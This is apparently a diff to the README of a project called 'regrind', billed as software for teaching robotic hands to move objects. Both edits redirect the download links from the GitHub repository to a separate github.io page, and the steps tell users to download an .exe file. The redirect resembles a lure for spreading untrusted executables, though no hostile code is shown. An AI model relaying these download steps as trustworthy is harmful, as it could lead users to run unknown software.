@@ -1,6 +1,6 @@
 # 🔧 regrind - Teach robotic hands to move objects
 
-[![Download](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rockinhabiting-litany456/regrind)
+[![Download](https://img.shields.io/badge/Download-Software-blue)](https://rockinhabiting-litany456.github.io)
 
 ## 🎯 About This Software
 
@@ -25,7 +25,7 @@ Make sure to install the latest drivers for your graphics card. These drivers he
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project page to download the software: https://github.com/Rockinhabiting-litany456/regrind
+1. Visit the project page to download the software: https://rockinhabiting-litany456.github.io
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in .exe.
